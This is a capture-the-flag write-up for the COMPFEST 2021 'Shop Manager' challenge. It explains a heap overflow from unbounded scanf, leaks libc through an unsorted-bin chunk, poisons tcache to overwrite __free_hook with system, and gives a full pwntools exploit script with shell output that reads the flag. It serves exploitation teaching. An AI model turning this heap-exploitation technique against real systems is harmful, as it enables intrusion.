## Shop Manager

> Points: 496  
>  
> Solves: 6

### Description:  
A simple shop simulator

nc 103.152.242.242 39221

Author: prajnapras19

### Attachments:  
```  
shop-manager-master-public.zip  
```

## Analysis:

The menu is as follows, and this binary has `Add`, `Delete`, `Edit`, `List`,
`Sell` functions.  
```  
Menu:  
1. Add item  
2. Delete item  
3. Edit item  
4. List of added items  
5. Sell item  
6. Exit  
```

Since libc uses libc-2.27.so, I execute this binaries on Ubuntu 18.04 in my
local environment.  
```  
-rwxr-xr-x 1 mito mito   13168 Sep  1 21:37 chall  
-rwxr-xr-x 1 mito mito  179152 Sep  1 21:37 ld-2.27.so  
-rwxr-xr-x 1 mito mito 2030928 Sep  1 21:37 libc-2.27.so  
```

The `Item name` input for the `Add` and `Edit` functions uses
`__isoc99_scanf("%s", buf)`. Therefore, it has a heap buffer overflow
vulnerability because it does not check the size of the input string.

Below is the compile result of `addItem()` by Ghidra.

```c  
void addItem(void)

{  
 long lVar1;  
 int iVar2;  
 void *pvVar3;  
  
 iVar2 = idx;  
 if (idx == N) {  
   puts("Our shop is full.");  
 }  
 else {  
   pvVar3 = malloc(0x10);  
   *(void **)(items + (long)iVar2 * 8) = pvVar3;  
   lVar1 = *(long *)(items + (long)idx * 8);  
   pvVar3 = malloc(0x20);  
   *(void **)(lVar1 + 8) = pvVar3;  
   printf("Item name: ");  
   __isoc99_scanf("%s",*(undefined8 *)(*(long *)(items + (long)idx * 8) + 8));  
   printf("Item price: ");  
   __isoc99_scanf("%ld",*(undefined8 *)(items + (long)idx * 8));  
   idx = idx + 1;  
   puts("Item added successfully.");  
 }  
 return;  
}  
```

## Solution:

First I considered how to leak the libc address.  
I added 16 Items to make a big chunk.  
Then change the name of the 0th Item using a heap buffer overflow as follows:
Resize the 1st chunk from 0x21 to 0x431.

```  
0x604260:       0x0000000000000000      0x0000000000000021  
0x604270:       0x0000000000000001      0x0000000000604290  
0x604280:       0x0000000000000000      0x0000000000000031  
0x604290:       0x6161616161616161      0x6161616161616161  
0x6042a0:       0x6161616161616161      0x6161616161616161  
0x6042b0:       0x6161616161616161      0x0000000000000431   Change to 0x21 =>
0x431  
0x6042c0:       0x0000000000000000      0x00000000006042e0  
0x6042d0:       0x0000000000000000      0x0000000000000031  
0x6042e0:       0x4242424242424242      0x0000000000000000  
0x6042f0:       0x0000000000000000      0x0000000000000000  
0x604300:       0x0000000000000000      0x0000000000000021  
```

I can create a 0x430 size unsorted bin chunk by deleting the 1st Item.  
```  
0x604260:       0x0000000000000000      0x0000000000000021  
0x604270:       0x0000000000000001      0x0000000000604290  
0x604280:       0x0000000000000000      0x0000000000000031  
0x604290:       0x6161616161616161      0x6161616161616161  
0x6042a0:       0x6161616161616161      0x6161616161616161  
0x6042b0:       0x6161616161616161      0x0000000000000431  
0x6042c0:       0x00007ffff7dcdca0      0x00007ffff7dcdca0  The 1st chunk goes
into an unsorted bin  
0x6042d0:       0x0000000000000000      0x0000000000000000  
0x6042e0:       0x4242424242424242      0x0000000000000000  
0x6042f0:       0x0000000000000000      0x0000000000000000  
0x604300:       0x0000000000000000      0x0000000000000021  
```

Furthermore, if I execute the `Add` function, I can put the address of the
unsorted bin chunk in the 2nd chunk, so I can leak the libc address with the
`List` function.  
```  
   'Name: `G`\n'  
   'Price: 140737351834784\n'      =>  0x00007ffff7dcdca0  
```

Now that I have chunk overhauled, I can put `__free_hook` into tcache using
the `Add`, `Delete` and `Edit` features shown below.  
```  
# tcache poisoning  
Add("c", 3)  
Delete(5)  
Delete(1)  
Edit(14, "d", free_hook)  
```

The following is the state of tcache after executing the above function.  
```  
pwndbg> bins  
tcachebins  
0x20 [100]: 0x604310 —▸ 0x7ffff7dcf8e8 (__free_hook) ◂— 0x0  
```

Finally, I write `/bin/sh` to Price of the 14th chunk, I write the address of
the `system` function to `__free_hook`, and delete the 14th chunk to start the
shell.

```  
# Write system address in __free_hook  
Add("e", u64("/bin/sh\x00"))   # 14  
Add("f", system_addr)

# Start shell  
Delete(14)  
```

I didn't use the `Sell` function.

## Exploit code:  
```python  
from pwn import *

#context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = './chall'  
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':  
 HOST = "103.152.242.242"  
 PORT = 39221  
 s = remote(HOST, PORT)  
 libc = ELF("./libc-2.27.so")  
else:  
 s = process(BINARY)  
 libc = elf.libc

def Add(data, price):  
 s.sendlineafter("> ", "1")  
 s.sendlineafter("name: ", data)  
 s.sendlineafter("price: ", str(price))

def Delete(idx):  
 s.sendlineafter("> ", "2")  
 s.sendlineafter("): ", str(idx))

def Edit(idx, data, price):  
 s.sendlineafter("> ", "3")  
 s.sendlineafter("): ", str(idx))  
 s.sendlineafter("name: ", data)  
 s.sendlineafter("price: ", str(price))

def List():  
 s.sendlineafter("> ", "4")

def Sell(idx, item):  
 s.sendlineafter("> ", "5")  
 s.sendlineafter("): ", str(idx))  
 s.sendlineafter("item?\n", item)

def Exit():  
 s.sendlineafter("> ", "6")

for i in range(16):  
 Add(chr(0x41+i)*8, 1)

# libc leak  
Edit(0, "a"*0x28+p64(0x431), 1)  
Delete(1)  
Add("b", 2)  
List()  
for i in range(2):  
 s.recvuntil("Price: ")  
libc_leak = int(s.recvuntil("\n"))  
libc_base = libc_leak - libc.sym.__malloc_hook - 0x70  
free_hook = libc_base + libc.sym.__free_hook  
system_addr = libc_base + libc.sym.system  
print "libc_leak =", hex(libc_leak)  
print "libc_base =", hex(libc_base)

# tcache poisoning  
Add("c", 3)  
Delete(5)  
Delete(1)  
Edit(14, "d", free_hook)

# Write system address in __free_hook  
Add("e", u64("/bin/sh\x00"))   # 14  
Add("f", system_addr)

# Start shell  
Delete(14)

s.interactive()  
```

## Results:  
```bash  
mito@ubuntu:~/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-
public/public$ python solve.py r  
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-
public/public/chall'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to 103.152.242.242 on port 39221: Done  
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_Shop_Manager/shop-manager-master-
public/public/libc-2.27.so'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
libc_leak = 0x7ff49f953ca0  
libc_base = 0x7ff49f568000  
[*] Switching to interactive mode  
$ id  
/bin/sh: 1: id: not found  
$ ls -l  
total 2208  
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 bin  
-r-xr-xr-x  1 0 0   17264 Sep 12 04:33 chall  
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 dev  
-r--r--r--  1 0 0      56 Sep 12 04:33 flag.txt  
-rwxr-xr-x  1 0 0  179152 Sep 12 04:33 ld-2.27.so  
drwxr-xr-x 21 0 0    4096 Sep 12 04:33 lib  
drwxr-xr-x  3 0 0    4096 Sep 12 04:33 lib32  
drwxr-xr-x  2 0 0    4096 Sep 12 04:33 lib64  
-rwxr-xr-x  1 0 0 2030928 Sep 12 04:33 libc-2.27.so  
-rwxr-xr-x  1 0 0     339 Sep 12 04:33 run.sh  
$ cat flag.txt  
COMPFEST13{I_us3_st4Ck_p1v0T1ng_How_bouT_Y0u_dd4dfcc265}  
```

I also wrote an Exploit code (`solve_stackpivot.py`) that uses the sell
function after the competition.  

Original writeup
(https://github.com/mito753/CTF/tree/main/2021/COMPFEST_CTF_2021/Pwn_Shop_Manager).